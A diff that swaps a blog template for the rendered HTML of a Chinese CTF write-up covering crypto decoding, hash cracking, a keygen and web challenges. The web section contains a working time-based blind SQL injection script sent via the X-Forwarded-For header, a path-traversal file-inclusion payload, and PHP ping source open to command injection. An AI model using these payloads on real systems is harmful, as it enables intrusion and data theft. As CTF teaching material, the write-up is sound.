@@ -1,23 +1,517 @@
-{% extends '_layout.swig' %}
-{% import '_macro/post.swig' as post_template %}
-{% import '_macro/sidebar.swig' as sidebar_template %}
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://github.com/Windylh/image/raw/master/icon.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://github.com/Windylh/image/raw/master/icon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://github.com/Windylh/image/raw/master/icon.ico">
+  <link rel="mask-icon" href="https://github.com/Windylh/image/raw/master/icon.ico" color="#222">
 
-{% block title %}{{ page.title }} | {{ title }}{% endblock %}
+<link rel="stylesheet" href="/css/main.css">
 
-{% block page_class %}page-post-detail{% endblock %}
 
-{% block content %}
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
-  <div id="posts" class="posts-expand">
-    {{ post_template.render(page) }}
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="Crypto解密1\u606d\u559c\u60a8\uff01\u006b\u0065\u0079\u007b\u0074\u0068\u0065\u0020\u0066\u0069\u0072\u0073\u0074\u0020\u006b\u0065\u0079\u007d Unicode编码，直接解码恭喜您！key&#123;the first key&#125; flag：key&amp;#1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="火种CTF Writeup">
+<meta property="og:url" content="http://yoursite.com/2017/07/11/%E7%81%AB%E7%A7%8DCTF%20Writeup/index.html">
+<meta property="og:site_name" content="Windylh&#39;s blog">
+<meta property="og:description" content="Crypto解密1\u606d\u559c\u60a8\uff01\u006b\u0065\u0079\u007b\u0074\u0068\u0065\u0020\u0066\u0069\u0072\u0073\u0074\u0020\u006b\u0065\u0079\u007d Unicode编码，直接解码恭喜您！key&#123;the first key&#125; flag：key&amp;#1">
+<meta property="og:locale">
+<meta property="article:published_time" content="2017-07-10T16:00:00.000Z">
+<meta property="article:modified_time" content="2018-11-01T10:52:51.780Z">
+<meta property="article:author" content="Windylh">
+<meta property="article:tag" content="WriteUp">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://yoursite.com/2017/07/11/%E7%81%AB%E7%A7%8DCTF%20Writeup/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>火种CTF Writeup | Windylh's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
   </div>
 
-{% endblock %}
+  <div class="site-meta">
 
-{% block sidebar %}
-  {{ sidebar_template.render(true) }}
-{% endblock %}
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Windylh's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
 
-{% block script_extra %}
-  {% include '_scripts/pages/post-details.swig' %}
-{% endblock %}
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/07/11/%E7%81%AB%E7%A7%8DCTF%20Writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Windylh">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Windylh's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          火种CTF Writeup
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2017-07-11 00:00:00" itemprop="dateCreated datePublished" datetime="2017-07-11T00:00:00+08:00">2017-07-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2018-11-01 18:52:51" itemprop="dateModified" datetime="2018-11-01T18:52:51+08:00">2018-11-01</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="解密1"><a href="#解密1" class="headerlink" title="解密1"></a>解密1</h3><p><code>\u606d\u559c\u60a8\uff01\u006b\u0065\u0079\u007b\u0074\u0068\u0065\u0020\u0066\u0069\u0072\u0073\u0074\u0020\u006b\u0065\u0079\u007d</code></p>
+<p>Unicode编码，直接解码<code>恭喜您！key&#123;the first key&#125;</code></p>
+<p>flag：<code>key&#123;the first key&#125;</code></p>
+<span id="more"></span>
+<h3 id="解密2"><a href="#解密2" class="headerlink" title="解密2"></a>解密2</h3><p><code>Tk5TWFM2M0pPTlJXR1kzR09KVEdPNURCTVZUR0NaM1NOQjJIMj09PQ==</code></p>
+<p>大小写，带等号base64，直接扔到脚本解密。</p>
+<p>flag：<code>key&#123;iscccfrfgtaefagrht&#125;</code></p>
+<h3 id="解密4"><a href="#解密4" class="headerlink" title="解密4"></a>解密4</h3><p><code>内容：二战时盟军截获德军一段密码，密文为：00000100001000001101000001100001010（密钥：large）</code></p>
+<p>搜索二战时德军密码得到<a href="http://baike.baidu.com/item/%E8%B4%B9%E7%BA%B3%E5%A7%86%E5%AF%86%E7%A0%81"><strong>费娜姆密码</strong></a></p>
+<p>将密钥转化为二进制与密文异或即可解密</p>
+<p>flag：<code>nihao</code></p>
+<h3 id="解密5"><a href="#解密5" class="headerlink" title="解密5"></a>解密5</h3><p><code>我来，我见，我征服 e6Z9i~]8R~U~QHE&#123;RnY&#123;QXg~QnQ&#123;^XVlRXlp^XI5Q6Q6SKY8jUAA</code></p>
+<p>试了一些加密方法，发现是凯撒(可能跟<code>我征服</code>有关吧)。</p>
+<p>python脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">s=<span class="string">&#x27;e6Z9i~]8R~U~QHE&#123;RnY&#123;QXg~QnQ&#123;^XVlRXlp^XI5Q6Q6SKY8jUAA&#x27;</span></span><br><span class="line">l=<span class="built_in">len</span>(s)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">    d=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,l):</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">ord</span>(s[j:j+<span class="number">1</span>])+i&gt;<span class="number">128</span>):</span><br><span class="line">            d=d+<span class="built_in">chr</span>(<span class="built_in">ord</span>(s[j:j+<span class="number">1</span>])+i-<span class="number">128</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            d=d+<span class="built_in">chr</span>(<span class="built_in">ord</span>(s[j:j+<span class="number">1</span>])+i)</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">str</span>(i)+<span class="string">&quot;:&quot;</span>+d</span><br></pre></td></tr></table></figure>
+<p>解码得到：<code>a2V5ezY4NzQzMDAwNjUwMTczMjMwZTRhNThlZTE1M2M2OGU4fQ==</code></p>
+<p>base64解码得到flag。</p>
+<p>flag：<code>key&#123;68743000650173230e4a58ee153c68e8&#125;</code></p>
+<h3 id="解密6"><a href="#解密6" class="headerlink" title="解密6"></a>解密6</h3><p><code>小明入侵网站后获得了管理员的密文，由于太高兴了手一抖把密文删除了一部分，只剩下前10位d9ddd1800f，小明根据社工知道管理员的密码习惯是4位的数字加字母，你能帮小明恢复密码的哈希值吗？（提示：flag为密码的哈希值）</code></p>
+<p>直接写脚本爆破：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">md5=<span class="string">&#x27;d9ddd1800f&#x27;</span></span><br><span class="line">s=<span class="string">r&#x27;1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxc&#x27;</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> s:</span><br><span class="line">                st=a+b+c+d</span><br><span class="line">                mst=hashlib.md5(st).hexdigest()</span><br><span class="line">                <span class="keyword">if</span>(mst[<span class="number">0</span>:<span class="number">10</span>]==md5[<span class="number">0</span>:<span class="number">10</span>]):</span><br><span class="line">                    <span class="built_in">print</span> mst</span><br><span class="line">                    <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>flag:<code>d9ddd1800fb812bd62e3fc55c35599b0</code></p>
+<h3 id="解密7"><a href="#解密7" class="headerlink" title="解密7"></a>解密7</h3><p><code>你猜这是什么东西，记得破解后把其中的密码给我。 00031141:Administrator:s1riu5:C6AE3F7D7534AE05AAD3B435B51404EE:65D4F6EC4BE18E14F3665804EF1E9496（答案为非常规形式）</code></p>
+<p>百度得知是LM-Hash。直接用工具解密得到密码<code>456278</code></p>
+<p>flag：<code>456278</code></p>
+<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="注册码去哪儿了："><a href="#注册码去哪儿了：" class="headerlink" title="注册码去哪儿了："></a>注册码去哪儿了：</h3><p>提示flag为<code>anyuntec</code>对应的注册码。用ida打开。</p>
+<p>反编译sub_401060函数，核心加密过程如下。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(&amp;String); ++i )</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">if</span> ( *(&amp;v7 + i) != i + *(&amp;String + i) - <span class="built_in">strlen</span>(&amp;String) )</span><br><span class="line">       <span class="keyword">break</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>发现string储存了对应的用户名，并将每一位减去用户名的长度l，加上对应的位数，就是result。</p>
+<p>python脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">string=<span class="string">&#x27;anyuntec&#x27;</span></span><br><span class="line">l=<span class="built_in">len</span>(string)</span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">j=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">    result=result+<span class="built_in">chr</span>(j+<span class="built_in">ord</span>(i)-l)</span><br><span class="line">    j=j+<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span> result</span><br></pre></td></tr></table></figure>
+
+<p>flag:<code>Ygspjqcb</code></p>
+<h3 id="一个简单的PE逆向"><a href="#一个简单的PE逆向" class="headerlink" title="一个简单的PE逆向"></a>一个简单的PE逆向</h3><p>放入ida，发现众多函数，查找字符串定位函数。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">v26 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">1</span>;</span><br><span class="line">  v5 = <span class="number">4</span>;</span><br><span class="line">  v6 = <span class="number">14</span>;</span><br><span class="line">  v7 = <span class="number">10</span>;</span><br><span class="line">  v8 = <span class="number">5</span>;</span><br><span class="line">  v9 = <span class="number">36</span>;</span><br><span class="line">  v10 = <span class="number">23</span>;</span><br><span class="line">  v11 = <span class="number">42</span>;</span><br><span class="line">  v12 = <span class="number">13</span>;</span><br><span class="line">  v13 = <span class="number">19</span>;</span><br><span class="line">  v14 = <span class="number">28</span>;</span><br><span class="line">  v15 = <span class="number">13</span>;</span><br><span class="line">  v16 = <span class="number">27</span>;</span><br><span class="line">  v17 = <span class="number">39</span>;</span><br><span class="line">  v18 = <span class="number">48</span>;</span><br><span class="line">  v19 = <span class="number">41</span>;</span><br><span class="line">  v20 = <span class="number">42</span>;</span><br><span class="line">  v21 = <span class="number">26</span>;</span><br><span class="line">  v22 = <span class="number">20</span>;</span><br><span class="line">  v23 = <span class="number">59</span>;</span><br><span class="line">  v24 = <span class="number">4</span>;</span><br><span class="line">  v25 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;please enter flag:&quot;</span>);</span><br><span class="line">  <span class="built_in">sub_411136</span>();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">getch</span>();</span><br><span class="line">    v1 = <span class="built_in">sub_411136</span>();</span><br><span class="line">    v27[v26] = v1;</span><br><span class="line">    <span class="keyword">if</span> ( !v1 || v27[v26] == <span class="number">13</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v27[v26] == <span class="number">8</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\b\b&quot;</span>);</span><br><span class="line">      <span class="built_in">sub_411136</span>();</span><br><span class="line">      --v26;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, v27[v26]);</span><br><span class="line">      <span class="built_in">sub_411136</span>();</span><br><span class="line">      ++v26;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">17</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v27[i] != byte_415768[*(&amp;v4 + i)] )<span class="comment">//KfxEeft&#125;f&#123;gyrYgthtyhifsjei53UUrrr_t2cdsef66246087138\0087138</span></span><br><span class="line">      v3 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v28 != <span class="string">&#x27;1&#x27;</span> || v29 != <span class="string">&#x27;0&#x27;</span> || v30 != <span class="string">&#x27;2&#x27;</span> || v31 != <span class="string">&#x27;4&#x27;</span> || v32 != <span class="string">&#x27;&#125;&#x27;</span> )</span><br><span class="line">    v3 = <span class="number">1</span>;</span><br><span class="line">  v27[v26] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\r\n&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>将字符串按照数组v4的数字取出与v27比较，如果相等，则success。</p>
+<p>v4数组即最上方连续的一串整形变量，<code>(1,4,14,10,5,36,23,42,13,19,28,13,27,39,48,41,42,26,20,59)</code>，相应的字符串为<code>KfxEeft&#125;f&#123;gyrYgthtyhifsjei53UUrrr_t2cdsef66246087138\0087138</code>，v27最后几位也就是<code>1024&#125;</code>，根据过程编写脚本。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">st = <span class="string">&#x27;KfxEeft&#125;f&#123;gyrYgthtyhifsjei53UUrrr_t2cdsef66246087138\0087138&#x27;</span></span><br><span class="line">index = (<span class="number">1</span>,<span class="number">4</span>,<span class="number">14</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">36</span>,<span class="number">23</span>,<span class="number">42</span>,<span class="number">13</span>,<span class="number">19</span>,<span class="number">28</span>,<span class="number">13</span>,<span class="number">27</span>,<span class="number">39</span>,<span class="number">48</span>,<span class="number">41</span>,<span class="number">42</span>,<span class="number">26</span>,<span class="number">20</span>,<span class="number">59</span>)</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">17</span>):</span><br><span class="line">    flag = flag + st[index[n]-<span class="number">1</span>:index[n]]</span><br><span class="line"><span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure>
+
+<p>flag:<code>KEY&#123;e2s6ry3r5s8f61024&#125;</code></p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="一道简单的Web题"><a href="#一道简单的Web题" class="headerlink" title="一道简单的Web题"></a>一道简单的Web题</h3><p>网站显示：<code>your ip is :xxx</code>，类似于<a href="http://www.shiyanbar.com/ctf/1941">实验吧whoareyou</a>运用的是<code>X-Forwarded-For</code>注入。<br>脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url=<span class="string">&quot;http://xxxx&quot;</span></span><br><span class="line">guess=string.lowercase + string.uppercase + string.digits+<span class="string">&#x27;&#123;&#x27;</span>+<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    havetry=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">str</span> <span class="keyword">in</span> guess:</span><br><span class="line">        headers=&#123;<span class="string">&quot;x-forwarded-for&quot;</span>:<span class="string">&quot;&#x27; +(select case when (substring((select flag from flag ) from %d for 1 )=&#x27;%s&#x27;) then sleep(7) else 1 end ) and &#x27;1&#x27;=&#x27;1&quot;</span> %(i,<span class="built_in">str</span>)&#125;</span><br><span class="line">        <span class="keyword">try</span>: </span><br><span class="line">            res=requests.get(url,headers=headers,timeout=<span class="number">7</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout, e:</span><br><span class="line">            havetry=<span class="number">1</span></span><br><span class="line">            flag = flag + <span class="built_in">str</span></span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;flag:&quot;</span>, flag</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> havetry==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;result:&#x27;</span> + flag</span><br></pre></td></tr></table></figure>
+<p>flag:<code>flag&#123;4c9551d5be5612f7bb5d286785&#125;</code></p>
+<h3 id="猜猜我在哪"><a href="#猜猜我在哪" class="headerlink" title="猜猜我在哪"></a>猜猜我在哪</h3><p>网站显示<code>../flag.php</code>。</p>
+<p>访问<code>robot.txt</code>提示查看<code>index.txt</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">```php</span><br><span class="line">&lt;?php</span><br><span class="line">if (empty($_GET[&quot;file&quot;]))&#123;</span><br><span class="line">    echo(&#x27;../flag.php&#x27;);</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $filename=&#x27;pages/&#x27;.(isset($_GET[&quot;file])?$_GET[&quot;file&quot;]:&quot;welcome.txt&quot;).&#x27;.html&#x27;;</span><br><span class="line">    include $filename;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>文件包含,需要查看<code>flag.php</code>，但是最后有<code>.html</code>,需要<code>%00</code>作为文件的截断。</p>
+<p>不知道文件具体位置。只好多<code>../</code>了几次，得到了flag。</p>
+<p>payload：<code>?file=../../../../../flag.php%00</code></p>
+<p>flag:<code>flag&#123;31de3cbfdf2884987e65f77ebb5ac338&#125;</code></p>
+<h3 id="前端跑路了QAQ"><a href="#前端跑路了QAQ" class="headerlink" title="前端跑路了QAQ"></a>前端跑路了QAQ</h3><p>打开index.php还是啥都没有，猜测index.txt，发现index.php的源码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="variable">$ip</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ip&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;ip&#x27;</span>]:<span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;/i&#x27;</span>,<span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;ip 格式错误!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$ip</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$ip</span>)&lt;<span class="number">7</span>||<span class="title function_ invoke__">strlen</span>(<span class="variable">$ip</span>)&gt;<span class="number">21</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;ip 长度错误!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        </span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> .<span class="variable">$ip</span> );</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 1 &#x27;</span> .<span class="variable">$ip</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line"><span class="keyword">echo</span>  <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>判断字符串长度和格式符合ip规则，并执行ping命令，输入ip试试。</p>
+<p>post：<code>ip=1.1.1.1</code></p>
